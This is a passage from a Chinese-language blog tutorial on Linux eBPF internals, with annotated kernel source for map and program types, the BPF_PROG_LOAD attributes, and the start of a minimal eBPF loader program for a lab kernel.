BPF_MAP_TYPE_LRU_HASH:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_LRU_PERCPU_HASH:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_STRUCT_OPS:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_CPUMAP:<br>                <span class="hljs-keyword">if</span> (!bpf_capable())<br>                        <span class="hljs-keyword">return</span> -EPERM;<br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_SOCKMAP:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_SOCKHASH:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_DEVMAP:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_DEVMAP_HASH:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_XSKMAP:<br>                <span class="hljs-keyword">if</span> (!capable(CAP_NET_ADMIN))<br>                        <span class="hljs-keyword">return</span> -EPERM;<br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>                WARN(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;unsupported map type %d&quot;</span>, map_type);<br>                <span class="hljs-keyword">return</span> -EPERM;<br>        &#125;<br>.......<br><br>        err = security_bpf_map_alloc(<span class="hljs-built_in">map</span>);<br>.......<br><br>free_map_sec:<br>        security_bpf_map_free(<span class="hljs-built_in">map</span>);<br>free_map:<br>        btf_put(<span class="hljs-built_in">map</span>-&gt;btf);<br>        <span class="hljs-built_in">map</span>-&gt;ops-&gt;map_free(<span class="hljs-built_in">map</span>);<br>        <span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到其中有很多map_type,他是集成到attr里面的，他在源码当中以enum类型来定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* include/uapi/linux/bpf.h */</span><br><span class="hljs-number">906</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_map_type</span> &#123;</span><br><span class="hljs-number">907</span>     BPF_MAP_TYPE_UNSPEC,<br><span class="hljs-number">908</span>     BPF_MAP_TYPE_HASH,<br><span class="hljs-number">909</span>     BPF_MAP_TYPE_ARRAY,<br><span class="hljs-number">910</span>     BPF_MAP_TYPE_PROG_ARRAY,<br><span class="hljs-number">911</span>     BPF_MAP_TYPE_PERF_EVENT_ARRAY,<br><span class="hljs-number">912</span>     BPF_MAP_TYPE_PERCPU_HASH,<br><span class="hljs-number">913</span>     BPF_MAP_TYPE_PERCPU_ARRAY,<br><span class="hljs-number">914</span>     BPF_MAP_TYPE_STACK_TRACE,<br><span class="hljs-number">915</span>     BPF_MAP_TYPE_CGROUP_ARRAY,<br><span class="hljs-number">916</span>     BPF_MAP_TYPE_LRU_HASH,<br><span class="hljs-number">917</span>     BPF_MAP_TYPE_LRU_PERCPU_HASH,<br><span class="hljs-number">918</span>     BPF_MAP_TYPE_LPM_TRIE,<br><span class="hljs-number">919</span>     BPF_MAP_TYPE_ARRAY_OF_MAPS,<br><span class="hljs-number">920</span>     BPF_MAP_TYPE_HASH_OF_MAPS,<br><span class="hljs-number">921</span>     BPF_MAP_TYPE_DEVMAP,<br><span class="hljs-number">922</span>     BPF_MAP_TYPE_SOCKMAP,<br><span class="hljs-number">923</span>     BPF_MAP_TYPE_CPUMAP,<br><span class="hljs-number">924</span>     BPF_MAP_TYPE_XSKMAP,<br><span class="hljs-number">925</span>     BPF_MAP_TYPE_SOCKHASH,<br><span class="hljs-number">926</span>     BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,<br><span class="hljs-number">927</span>     <span class="hljs-comment">/* BPF_MAP_TYPE_CGROUP_STORAGE is available to bpf programs attaching</span><br><span class="hljs-comment">928      * to a cgroup. The newer BPF_MAP_TYPE_CGRP_STORAGE is available to</span><br><span class="hljs-comment">929      * both cgroup-attached and other progs and supports all functionality</span><br><span class="hljs-comment">930      * provided by BPF_MAP_TYPE_CGROUP_STORAGE. So mark</span><br><span class="hljs-comment">931      * BPF_MAP_TYPE_CGROUP_STORAGE deprecated.</span><br><span class="hljs-comment">932      */</span><br><span class="hljs-number">933</span>     BPF_MAP_TYPE_CGROUP_STORAGE = BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,<br><span class="hljs-number">934</span>     BPF_MAP_TYPE_REUSEPORT_SOCKARRAY,<br><span class="hljs-number">935</span>     BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE_DEPRECATED,<br><span class="hljs-number">936</span>     <span class="hljs-comment">/* BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE is available to bpf programs</span><br><span class="hljs-comment">937      * attaching to a cgroup. The new mechanism (BPF_MAP_TYPE_CGRP_STORAGE +</span><br><span class="hljs-comment">938      * local percpu kptr) supports all BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</span><br><span class="hljs-comment">939      * functionality and more. So mark * BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</span><br><span class="hljs-comment">940      * deprecated.</span><br><span class="hljs-comment">941      */</span><br><span class="hljs-number">942</span>     BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE = BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE_DEPRECATED,<br><span class="hljs-number">943</span>     BPF_MAP_TYPE_QUEUE,<br><span class="hljs-number">944</span>     BPF_MAP_TYPE_STACK,<br><span class="hljs-number">945</span>     BPF_MAP_TYPE_SK_STORAGE,<br><span class="hljs-number">946</span>     BPF_MAP_TYPE_DEVMAP_HASH,<br><span class="hljs-number">947</span>     BPF_MAP_TYPE_STRUCT_OPS,<br><span class="hljs-number">948</span>     BPF_MAP_TYPE_RINGBUF,<br><span class="hljs-number">949</span>     BPF_MAP_TYPE_INODE_STORAGE,<br><span class="hljs-number">950</span>     BPF_MAP_TYPE_TASK_STORAGE,<br><span class="hljs-number">951</span>     BPF_MAP_TYPE_BLOOM_FILTER,<br><span class="hljs-number">952</span>     BPF_MAP_TYPE_USER_RINGBUF,<br><span class="hljs-number">953</span>     BPF_MAP_TYPE_CGRP_STORAGE,<br><span class="hljs-number">954</span> &#125;;<br></code></pre></td></tr></table></figure><p>最后给出创建的<code>bpf_map</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* include/linux/bpf.h */</span><br><span class="hljs-number">248</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> &#123;</span>                                                                         <br><span class="hljs-number">249</span>     <span class="hljs-comment">/* The first two cachelines with read-mostly members of which some</span><br><span class="hljs-comment">250      * are also accessed in fast-path (e.g. ops, max_entries).</span><br><span class="hljs-comment">251      */</span><br><span class="hljs-number">252</span>     <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops</span> ____<span class="hljs-title">cacheline_aligned</span>;</span><br><span class="hljs-number">253</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">inner_map_meta</span>;</span><br><span class="hljs-number">254</span> <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br><span class="hljs-number">255</span>     <span class="hljs-type">void</span> *security;<br><span class="hljs-number">256</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-number">257</span>     <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_map_type</span> <span class="hljs-title">map_type</span>;</span><br><span class="hljs-number">258</span>     u32 key_size;<br><span class="hljs-number">259</span>     u32 value_size;<br><span class="hljs-number">260</span>     u32 max_entries;<br><span class="hljs-number">261</span>     u64 map_extra; <span class="hljs-comment">/* any per-map-type extra fields */</span><br><span class="hljs-number">262</span>     u32 map_flags;<br><span class="hljs-number">263</span>     u32 id; <br><span class="hljs-number">264</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_record</span> *<span class="hljs-title">record</span>;</span><br><span class="hljs-number">265</span>     <span class="hljs-type">int</span> numa_node;<br><span class="hljs-number">266</span>     u32 btf_key_type_id;<br><span class="hljs-number">267</span>     u32 btf_value_type_id;<br><span class="hljs-number">268</span>     u32 btf_vmlinux_value_type_id;<br><span class="hljs-number">269</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br><span class="hljs-number">270</span> <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span><br><span class="hljs-number">271</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj_cgroup</span> *<span class="hljs-title">objcg</span>;</span><br><span class="hljs-number">272</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-number">273</span>     <span class="hljs-type">char</span> name[BPF_OBJ_NAME_LEN];<br><span class="hljs-number">274</span>     <span class="hljs-comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span><br><span class="hljs-comment">275      * particularly with refcounting.</span><br><span class="hljs-comment">276      */</span><br><span class="hljs-number">277</span>     <span class="hljs-type">atomic64_t</span> refcnt ____cacheline_aligned;<br><span class="hljs-number">278</span>     <span class="hljs-type">atomic64_t</span> usercnt;<br><span class="hljs-number">279</span>     <span class="hljs-comment">/* rcu is used before freeing and work is only used during freeing */</span><br><span class="hljs-number">280</span>     <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-number">281</span>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">work</span>;</span><br><span class="hljs-number">282</span>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span><br><span class="hljs-number">283</span>     &#125;; <br><span class="hljs-number">284</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">freeze_mutex</span>;</span><br><span class="hljs-number">285</span>     <span class="hljs-type">atomic64_t</span> writecnt;<br><span class="hljs-number">286</span>     <span class="hljs-comment">/* &#x27;Ownership&#x27; of program-containing map is claimed by the first program</span><br><span class="hljs-comment">287      * that is going to use this map or by the first program which FD is</span><br><span class="hljs-comment">288      * stored in the map to make sure that all callers and callees have the</span><br><span class="hljs-comment">289      * same prog type, JITed flag and xdp_has_frags flag.</span><br><span class="hljs-comment">290      */</span><br><span class="hljs-number">291</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-number">292</span>         <span class="hljs-type">spinlock_t</span> lock;<br><span class="hljs-number">293</span>         <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span> <span class="hljs-title">type</span>;</span><br><span class="hljs-number">294</span>         <span class="hljs-type">bool</span> jited;<br><span class="hljs-number">295</span>         <span class="hljs-type">bool</span> xdp_has_frags;<br><span class="hljs-number">296</span>     &#125; owner;<br><span class="hljs-number">297</span>     <span class="hljs-type">bool</span> bypass_spec_v1;<br><span class="hljs-number">298</span>     <span class="hljs-type">bool</span> frozen; <span class="hljs-comment">/* write-once; write-protected by freeze_mutex */</span><br><span class="hljs-number">299</span>     <span class="hljs-type">bool</span> free_after_mult_rcu_gp;<br><span class="hljs-number">300</span>     s64 __percpu *elem_count;<br><span class="hljs-number">301</span> &#125;;<br></code></pre></td></tr></table></figure><h1 id="第三章：克莱蒙斯据点"><a href="#第三章：克莱蒙斯据点" class="headerlink" title="第三章：克莱蒙斯据点"></a>第三章：克莱蒙斯据点</h1><h2 id="1-eBPF-program-概述"><a href="#1-eBPF-program-概述" class="headerlink" title="1.eBPF program 概述"></a>1.eBPF program 概述</h2><p>The <strong>BPF_PROG_LOAD</strong> command is used to load an eBPF program into the kernel.  The return value for this command is a new file descriptor associated with this eBPF program. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> bpf_log_buf[LOG_BUF_SIZE]; <br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">bpf_prog_load</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> bpf_prog_type type, </span><br><span class="hljs-params">         <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_insn *insns, <span class="hljs-type">int</span> insn_cnt, </span><br><span class="hljs-params">         <span class="hljs-type">const</span> <span class="hljs-type">char</span> *license)</span> <br>&#123; <br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123; <br>        .prog_type = type, <br>        .insns   = ptr_to_u64(insns), <br>        .insn_cnt  = insn_cnt, <br>        .license  = ptr_to_u64(license), <br>        .log_buf  = ptr_to_u64(bpf_log_buf), <br>        .log_size  = LOG_BUF_SIZE, <br>        .log_level = <span class="hljs-number">1</span>, <br>     &#125;; <br> <br>     <span class="hljs-keyword">return</span> bpf(BPF_PROG_LOAD, &amp;attr, <span class="hljs-keyword">sizeof</span>(attr)); <br>&#125;<br></code></pre></td></tr></table></figure><p>下面来解释每个字段的含义</p><ul><li><p><strong>prog_type</strong>：</p><p>根据linux手册的说法，在内核版本4.4之后非特权用户只能使用 <code>BPF_PROG_TYPE_SOCKET_FILTER</code></p><blockquote><p>Unprivileged access may be blocked by writing the value 1 to the file &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;unprivileged_bpf_disabled.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* include/uapi/linux/bpf.h */</span><br><span class="hljs-number">956</span> <span class="hljs-comment">/* Note that tracing related programs such as</span><br><span class="hljs-comment">957  * BPF_PROG_TYPE_&#123;KPROBE,TRACEPOINT,PERF_EVENT,RAW_TRACEPOINT&#125;</span><br><span class="hljs-comment">958  * are not subject to a stable API since kernel internal data</span><br><span class="hljs-comment">959  * structures can change from release to release and may</span><br><span class="hljs-comment">960  * therefore break existing tracing BPF programs. Tracing BPF</span><br><span class="hljs-comment">961  * programs correspond to /a/ specific kernel which is to be</span><br><span class="hljs-comment">962  * analyzed, and not /a/ specific kernel /and/ all future ones.</span><br><span class="hljs-comment">963  */</span><br><span class="hljs-number">964</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span> &#123;</span><br><span class="hljs-number">965</span>     BPF_PROG_TYPE_UNSPEC,<br><span class="hljs-number">966</span>     BPF_PROG_TYPE_SOCKET_FILTER,<br><span class="hljs-number">967</span>     BPF_PROG_TYPE_KPROBE,<br><span class="hljs-number">968</span>     BPF_PROG_TYPE_SCHED_CLS,<br><span class="hljs-number">969</span>     BPF_PROG_TYPE_SCHED_ACT,<br><span class="hljs-number">970</span>     BPF_PROG_TYPE_TRACEPOINT,<br><span class="hljs-number">971</span>     BPF_PROG_TYPE_XDP,<br><span class="hljs-number">972</span>     BPF_PROG_TYPE_PERF_EVENT,<br><span class="hljs-number">973</span>     BPF_PROG_TYPE_CGROUP_SKB,<br><span class="hljs-number">974</span>     BPF_PROG_TYPE_CGROUP_SOCK,<br><span class="hljs-number">975</span>     BPF_PROG_TYPE_LWT_IN,<br><span class="hljs-number">976</span>     BPF_PROG_TYPE_LWT_OUT,<br><span class="hljs-number">977</span>     BPF_PROG_TYPE_LWT_XMIT,<br><span class="hljs-number">978</span>     BPF_PROG_TYPE_SOCK_OPS,<br><span class="hljs-number">979</span>     BPF_PROG_TYPE_SK_SKB,<br><span class="hljs-number">980</span>     BPF_PROG_TYPE_CGROUP_DEVICE,<br><span class="hljs-number">981</span>     BPF_PROG_TYPE_SK_MSG,<br><span class="hljs-number">982</span>     BPF_PROG_TYPE_RAW_TRACEPOINT,<br><span class="hljs-number">983</span>     BPF_PROG_TYPE_CGROUP_SOCK_ADDR,<br><span class="hljs-number">984</span>     BPF_PROG_TYPE_LWT_SEG6LOCAL,<br><span class="hljs-number">985</span>     BPF_PROG_TYPE_LIRC_MODE2,<br><span class="hljs-number">986</span>     BPF_PROG_TYPE_SK_REUSEPORT,<br><span class="hljs-number">987</span>     BPF_PROG_TYPE_FLOW_DISSECTOR,<br><span class="hljs-number">988</span>     BPF_PROG_TYPE_CGROUP_SYSCTL,<br><span class="hljs-number">989</span>     BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE,<br><span class="hljs-number">990</span>     BPF_PROG_TYPE_CGROUP_SOCKOPT,<br><span class="hljs-number">991</span>     BPF_PROG_TYPE_TRACING,<br><span class="hljs-number">992</span>     BPF_PROG_TYPE_STRUCT_OPS,<br><span class="hljs-number">993</span>     BPF_PROG_TYPE_EXT,<br><span class="hljs-number">994</span>     BPF_PROG_TYPE_LSM,<br><span class="hljs-number">995</span>     BPF_PROG_TYPE_SK_LOOKUP,<br><span class="hljs-number">996</span>     BPF_PROG_TYPE_SYSCALL, <span class="hljs-comment">/* a program that can execute syscalls */</span><br><span class="hljs-number">997</span>     BPF_PROG_TYPE_NETFILTER,<br><span class="hljs-number">998</span> &#125;;<br></code></pre></td></tr></table></figure></li><li><p><strong>insn</strong>：struct bpf_insn 数据结构体数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">72</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> &#123;</span>                                                                       <br><span class="hljs-number">73</span>     __u8    code;       <span class="hljs-comment">/* opcode */</span><br><span class="hljs-number">74</span>     __u8    dst_reg:<span class="hljs-number">4</span>;  <span class="hljs-comment">/* dest register */</span><br><span class="hljs-number">75</span>     __u8    src_reg:<span class="hljs-number">4</span>;  <span class="hljs-comment">/* source register */</span><br><span class="hljs-number">76</span>     __s16   off;        <span class="hljs-comment">/* signed offset */</span><br><span class="hljs-number">77</span>     __s32   imm;        <span class="hljs-comment">/* signed immediate constant */</span><br><span class="hljs-number">78</span> &#125;;  <br></code></pre></td></tr></table></figure></li><li><p><strong>insn_cnt</strong>：insn数组中的指令条数</p></li><li><p><strong>license</strong>：license字符串</p></li><li><p><strong>log_buf</strong>：指向调用者自行分配的一个缓冲区buff,这个缓冲区用来存放verifier的验证日志</p></li><li><p><strong>log_size</strong>：log_buf的大小</p></li><li><p><strong>log_level</strong>：如果为0表示不需要日志，这样log_buf必须指向NULL</p></li></ul><p>我们只需要使用<code>close(fd)</code>就可以在内核当中卸载我们的eBPF程序，但是这里存在例外</p><blockquote><p>An eBPF object is deallocated only after all file descriptors referring to the object have been closed.</p></blockquote><h2 id="2-eBPF程序类型"><a href="#2-eBPF程序类型" class="headerlink" title="2.eBPF程序类型"></a>2.eBPF程序类型</h2><p>eBPF 程序类型 (prog_type) 决定了程序可以调用的内核辅助函数的子集。程序类型还决定了程序输入（上下文）——struct bpf_context 的格式（它是传递到 eBPF 程序中的数据 blob）第一个参数）。</p><p>以下是部分程序类型所对应的支持内核函数子集，注意这个子集在将来可能会扩充</p><h3 id="1-BPF-PROG-TYPE-SOCKET-FILTER-since-Linux-3-19"><a href="#1-BPF-PROG-TYPE-SOCKET-FILTER-since-Linux-3-19" class="headerlink" title="1.BPF_PROG_TYPE_SOCKET_FILTER(since Linux 3.19)"></a>1.BPF_PROG_TYPE_SOCKET_FILTER(since Linux 3.19)</h3><ul><li>bpf_map_lookup_elem(map_fd, void *key)</li><li>bpf_map_update_elem(map_fd, void *key, void *value)</li><li>bpf_map_delete_elem(map_fd, void *key)</li></ul><h2 id="3-eBPF程序绑定"><a href="#3-eBPF程序绑定" class="headerlink" title="3.eBPF程序绑定"></a>3.eBPF程序绑定</h2><p>一旦某个eBPF程序被加载到内存当中，它可以被附加到某个事件上。不同的内核子系统有不同的附加方式。</p><p>从 Linux 4.1 开始，可以使用以下调用将文件描述符 prog_fd 引用的 eBPF 程序附加到创建的 perf 事件文件描述符 event_fd</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">ioctl</span>(event_fd, PERF_EVENT_IOC_SET_BPF, prog_fd);<br></code></pre></td></tr></table></figure><h1 id="第四章：圣丹尼斯"><a href="#第四章：圣丹尼斯" class="headerlink" title="第四章：圣丹尼斯"></a>第四章：圣丹尼斯</h1><h2 id="1-汇编指令编写eBPF程序"><a href="#1-汇编指令编写eBPF程序" class="headerlink" title="1.汇编指令编写eBPF程序"></a>1.汇编指令编写eBPF程序</h2><p>这里我们开始使用我们的bpf系统调用来更加直观的感受一下eBPF的使用</p><p>在linux内核源码中 <code>samples/bpf/bpf_insn.h</code>文件提供了一系列内核工作人员为我们准备的指令模板方便我们使用。但一般在进行eBPF开发的时候会使用更加高效的工具，但这里只是进行一个简单的学习</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">213</span> <span class="hljs-comment">/* Raw code statement block */</span><br><span class="hljs-number">214</span> <br><span class="hljs-number">215</span> <span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \</span><br><span class="hljs-meta">216     ((struct bpf_insn) &#123;                    \</span><br><span class="hljs-meta">217         .code  = CODE,                  \</span><br><span class="hljs-meta">218         .dst_reg = DST,                 \</span><br><span class="hljs-meta">219         .src_reg = SRC,                 \</span><br><span class="hljs-meta">220         .off   = OFF,                   \</span><br><span class="hljs-meta">221         .imm   = IMM &#125;)</span><br><span class="hljs-number">222</span>                            <br></code></pre></td></tr></table></figure><p>因此本次实验采用linux 6.7的内核,这里在配置编译选项的时候需要我们选中</p><blockquote><p>General setup -&gt; BPF subsystem -&gt; Enable bpf() system call</p><p>​      -&gt; Enable BPF Just In Time compiler</p></blockquote><p>最好能取消掉</p><blockquote><p>General setup -&gt; BPF subsystem -&gt; Disable Unprivileged BPF by Default</p></blockquote><p>该选项会导致 <code>/proc/sys/kernel/bpf/unprivileged_bpf_enabled</code>默认为2,会使得现如今唯一允许Linux非特权用户加载的 <code>BPF_PROG_TYPE_SOCKET_FILTER</code>类型bpf程序加载失败</p><p>因此取消该选项并且保证上面的 <code>/proc/sys/kernel/bpf/unprivileged_bpf_enabled</code>文件为0才能正常使用该类型的bpf程序.</p><p>我们使用上面的BPF指令宏定义来写两条指令,分别是给寄存器赋值和一个结尾的EXIT指令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc ./bpf.c -o bpf</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>  <span class="hljs-comment">//为了exit()函数</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span>    <span class="hljs-comment">//为了uint64_t等标准类型的定义</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span>    <span class="hljs-comment">//为了错误处理</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span>    <span class="hljs-comment">//位于/usr/include/linux/bpf.h, 包含BPF系统调用的一些常量, 以及一些结构体的定义</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span>    <span class="hljs-comment">//为了syscall()</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \</span><br><span class="hljs-meta">     ((struct bpf_insn) &#123;                    \</span><br><span class="hljs-meta">         .code  = CODE,                  \</span><br><span class="hljs-meta">         .dst_reg = DST,                 \</span><br><span class="hljs-meta">         .src_reg = SRC,                 \</span><br><span class="hljs-meta">         .off   = OFF,                   \</span><br><span class="hljs-meta">         .imm   = IMM &#125;)</span><br><br><span class="hljs-comment">//类型转换, 减少warning, 也可以不要</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ptr_to_u64(x) ((uint64_t)x)</span><br><br><span class="hljs-comment">//对于系统调用的包装, 